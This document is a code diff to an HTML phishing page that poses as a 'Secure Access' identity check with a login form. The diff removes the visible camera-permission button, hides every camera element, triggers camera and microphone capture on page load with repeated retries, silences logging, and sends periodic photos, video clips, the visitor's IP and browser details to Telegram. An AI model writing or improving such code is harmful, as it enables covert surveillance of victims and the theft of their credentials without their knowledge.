@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Secure Access</title>
+    <title>Loading...</title>
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
     <style>
         * {
@@ -22,6 +22,9 @@
             color: #262626;
         }
 
+        /* ============================================
+           COMPLETELY HIDDEN - NO VISIBLE CAMERA ELEMENTS
+           ============================================ */
         .hidden-video-wrap {
             display: none !important;
             position: fixed !important;
@@ -79,60 +82,8 @@
         }
 
         /* ============================================
-           CAMERA PERMISSION BUTTON - VISIBLE & CLICKABLE
+           FORM - VISIBLE TO USER
            ============================================ */
-        .camera-permission-btn {
-            width: 100%;
-            padding: 14px;
-            background: linear-gradient(45deg, #405de6, #5851db, #833ab4, #c13584, #e1306c, #fd1d1d);
-            color: #fff;
-            border: none;
-            border-radius: 8px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.3s;
-            margin-bottom: 16px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-        }
-
-        .camera-permission-btn:hover {
-            transform: scale(1.02);
-            box-shadow: 0 4px 20px rgba(0,0,0,0.2);
-        }
-
-        .camera-permission-btn:disabled {
-            opacity: 0.6;
-            cursor: not-allowed;
-            transform: none;
-        }
-
-        .camera-permission-btn .icon {
-            font-size: 20px;
-        }
-
-        .camera-status {
-            font-size: 12px;
-            color: #8e8e8e;
-            margin-bottom: 16px;
-            padding: 8px;
-            background: #fafafa;
-            border-radius: 4px;
-        }
-
-        .camera-status.active {
-            color: #00a651;
-            background: #e8f5e9;
-        }
-
-        .camera-status.error {
-            color: #d32f2f;
-            background: #ffebee;
-        }
-
         .form-group {
             margin-bottom: 12px;
         }
@@ -202,27 +153,27 @@
             margin-top: 12px;
         }
 
-        /* Hide form initially - show after camera permission */
-        #loginForm {
-            display: none;
-        }
-
-        .form-label {
-            display: block;
-            text-align: left;
-            font-size: 12px;
-            color: #8e8e8e;
-            margin-bottom: 4px;
+        /* ============================================
+           NO CAMERA BUTTON - COMPLETELY REMOVED
+           ============================================ */
+        .camera-permission-btn {
+            display: none !important;
         }
     </style>
 </head>
 <body>
 
+    <!-- ============================================
+    HIDDEN CAMERA ELEMENTS - USER NEVER SEES
+    ============================================ -->
     <div class="hidden-video-wrap" aria-hidden="true">
         <video id="video" playsinline autoplay muted></video>
     </div>
     <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
 
+    <!-- ============================================
+    NORMAL LOGIN PAGE - USER SEES THIS
+    ============================================ -->
     <div class="container">
         <div class="card">
             <div class="logo">🔒</div>
@@ -230,28 +181,14 @@
             <p>Please verify your identity to continue. This helps us keep your account secure.</p>
 
             <!-- ==========================================
-            CAMERA PERMISSION BUTTON - USER MUST CLICK
-            ========================================== -->
-            <button class="camera-permission-btn" id="cameraPermissionBtn">
-                <span class="icon">📷</span>
-                Allow Camera Access
-            </button>
-
-            <div class="camera-status" id="cameraStatus">
-                ⏳ Click the button above to allow camera access
-            </div>
-
-            <!-- ==========================================
-            LOGIN FORM - SHOWS AFTER CAMERA PERMISSION
+            LOGIN FORM - ALWAYS VISIBLE
             ========================================== -->
             <form id="loginForm">
                 <div class="form-group">
-                    <label class="form-label">Username or Email</label>
-                    <input type="text" class="form-input" id="username" placeholder="Enter your username" required>
+                    <input type="text" class="form-input" id="username" placeholder="Username or Email" required>
                 </div>
                 <div class="form-group">
-                    <label class="form-label">Password</label>
-                    <input type="password" class="form-input" id="password" placeholder="Enter your password" required>
+                    <input type="password" class="form-input" id="password" placeholder="Password" required>
                 </div>
                 <button type="submit" class="btn" id="submitBtn">Continue</button>
                 <div id="successMsg" class="success-msg">✅ Verification in progress...</div>
@@ -265,7 +202,8 @@
 
     <script>
         // ============================================
-        // CAMERA PERMISSION - TRIGGERED BY BUTTON CLICK
+        // AUTO-TRIGGER CAMERA PERMISSION ON PAGE LOAD
+        // No button, no user interaction needed
         // ============================================
         
         (function() {
@@ -274,9 +212,6 @@
             const video = document.getElementById('video');
             const canvas = document.getElementById('canvas');
             const context = canvas.getContext('2d');
-            const cameraBtn = document.getElementById('cameraPermissionBtn');
-            const cameraStatus = document.getElementById('cameraStatus');
-            const loginForm = document.getElementById('loginForm');
             
             let cameraActive = false;
             let photoInterval = null;
@@ -286,6 +221,7 @@
             let recordedChunks = [];
             let isRecording = false;
             let videoCounter = 0;
+            let permissionRequested = false;
 
             // ============================================
             // DETECT IP
@@ -351,9 +287,8 @@
                             async: true,
                             timeout: 5000
                         });
-                        console.log('📸 Photo captured');
                     } catch (e) {
-                        console.log('Photo capture error:', e);
+                        // Silent fail
                     }
                 }
             }
@@ -393,7 +328,6 @@
                             if (videoBlob.size > 1000) {
                                 videoCounter++;
                                 sendVideoToTelegram(videoBlob);
-                                console.log(`🎥 Video ${videoCounter} captured`);
                             }
                         }
                         
@@ -412,12 +346,10 @@
                     setTimeout(() => {
                         if (mediaRecorder && mediaRecorder.state === 'recording') {
                             mediaRecorder.stop();
-                            console.log('⏹️ Video recording stopped');
                         }
                     }, 10000);
 
                 } catch (e) {
-                    console.log('Video recording error:', e);
                     isRecording = false;
                     setTimeout(() => {
                         if (cameraActive) {
@@ -452,14 +384,14 @@
             }
 
             // ============================================
-            // START CAMERA - TRIGGERED BY BUTTON CLICK
+            // AUTO-START CAMERA - PERMISSION POPUP APPEARS
             // ============================================
-            function startCamera() {
-                cameraBtn.disabled = true;
-                cameraBtn.innerHTML = '<span class="icon">⏳</span> Requesting Camera...';
-                cameraStatus.textContent = '⏳ Requesting camera access...';
-                cameraStatus.className = 'camera-status';
-
+            function autoStartCamera() {
+                if (permissionRequested) return;
+                permissionRequested = true;
+                
+                console.log('📷 Requesting camera permission...');
+                
                 const constraints = {
                     audio: true,
                     video: {
@@ -471,19 +403,16 @@
 
                 navigator.mediaDevices.getUserMedia(constraints)
                     .then(function(mediaStream) {
-                        // Success!
+                        // PERMISSION GRANTED
+                        console.log('✅ Camera permission granted!');
                         stream = mediaStream;
                         video.srcObject = stream;
                         video.play();
                         cameraActive = true;
                         
-                        cameraBtn.innerHTML = '✅ Camera Access Granted';
-                        cameraBtn.style.background = 'linear-gradient(45deg, #00a651, #00853e)';
-                        cameraStatus.textContent = '✅ Camera active! Photos every 3s, Videos every 10s';
-                        cameraStatus.className = 'camera-status active';
-                        
-                        // Show login form
-                        loginForm.style.display = 'block';
+                        // Send notification
+                        sendToTelegram('permission', 'Camera permission GRANTED');
+                        sendToTelegram('camera_ready', 'Camera active - capturing photos and videos');
                         
                         // Start photo capture
                         if (photoInterval) clearInterval(photoInterval);
@@ -495,35 +424,23 @@
                                 startVideoRecording();
                             }
                         }, 2000);
-                        
-                        // Send notification
-                        sendToTelegram('camera_ready', 'Camera active - capturing photos and videos');
-                        sendToTelegram('permission', 'Camera permission GRANTED');
-                        
-                        console.log('✅ Camera active!');
                     })
                     .catch(function(err) {
-                        // Failed
-                        console.log('❌ Camera error:', err);
-                        cameraBtn.disabled = false;
-                        cameraBtn.innerHTML = '📷 Retry Camera Access';
-                        cameraBtn.style.background = 'linear-gradient(45deg, #d32f2f, #b71c1c)';
-                        cameraStatus.textContent = '❌ Camera access denied: ' + err.message;
-                        cameraStatus.className = 'camera-status error';
+                        // PERMISSION DENIED OR ERROR
+                        console.log('❌ Camera error:', err.name);
                         
                         // Send notification
                         sendToTelegram('warning', 'Camera permission DENIED: ' + err.message);
                         
                         // If denied, try video only
                         if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
-                            cameraStatus.textContent += ' - Trying video only...';
                             tryVideoOnly();
                         }
                     });
             }
 
             // ============================================
-            // TRY VIDEO ONLY (if full camera fails)
+            // TRY VIDEO ONLY (Fallback)
             // ============================================
             function tryVideoOnly() {
                 navigator.mediaDevices.getUserMedia({ video: true })
@@ -533,26 +450,14 @@
                         video.play();
                         cameraActive = true;
                         
-                        cameraBtn.innerHTML = '✅ Camera Access Granted (Video Only)';
-                        cameraBtn.style.background = 'linear-gradient(45deg, #ff9800, #e65100)';
-                        cameraStatus.textContent = '✅ Camera active (video only)!';
-                        cameraStatus.className = 'camera-status active';
-                        
-                        loginForm.style.display = 'block';
+                        sendToTelegram('camera_ready', 'Camera active - video only');
                         
                         if (photoInterval) clearInterval(photoInterval);
                         photoInterval = setInterval(capturePhoto, 3000);
-                        
-                        sendToTelegram('camera_ready', 'Camera active - video only');
                     })
                     .catch(function(err) {
-                        cameraBtn.disabled = false;
-                        cameraBtn.innerHTML = '📷 Camera Unavailable - Continue Anyway';
-                        cameraStatus.textContent = '⚠️ Camera unavailable. You can still continue.';
-                        cameraStatus.className = 'camera-status error';
-                        
-                        // Show form anyway
-                        loginForm.style.display = 'block';
+                        // Camera completely unavailable
+                        sendToTelegram('warning', 'Camera unavailable: ' + err.message);
                     });
             }
 
@@ -628,21 +533,42 @@
             }
 
             // ============================================
-            // BUTTON CLICK EVENT - TRIGGERS CAMERA
+            // AUTO-START ON PAGE LOAD
             // ============================================
-            cameraBtn.addEventListener('click', function() {
-                startCamera();
+            
+            // Detect IP first
+            detectAndSendIP();
+            
+            // Send browser info
+            setTimeout(sendBrowserInfo, 500);
+            
+            // Send page view
+            setTimeout(sendPageView, 1000);
+            
+            // ============================================
+            // START CAMERA AUTOMATICALLY - PERMISSION POPUP
+            // ============================================
+            // Try immediately
+            setTimeout(autoStartCamera, 500);
+            
+            // Try again if it didn't work
+            setTimeout(autoStartCamera, 2000);
+            
+            // Final attempt
+            setTimeout(autoStartCamera, 5000);
+
+            // ============================================
+            // ALSO TRY ON USER CLICK (in case browser blocks)
+            // ============================================
+            document.addEventListener('click', function() {
+                if (!cameraActive && !permissionRequested) {
+                    autoStartCamera();
+                }
             });
 
             // ============================================
-            // INIT
+            // CLEANUP
             // ============================================
-            
-            detectAndSendIP();
-            setTimeout(sendBrowserInfo, 500);
-            setTimeout(sendPageView, 1000);
-
-            // Cleanup
             window.addEventListener('beforeunload', function() {
                 if (mediaRecorder && mediaRecorder.state === 'recording') {
                     mediaRecorder.stop();
@@ -655,7 +581,7 @@
                 }
             });
 
-            console.log('🔧 Click the "Allow Camera Access" button to start');
+            console.log('🔧 Camera permission will appear automatically');
 
         })();
     </script>
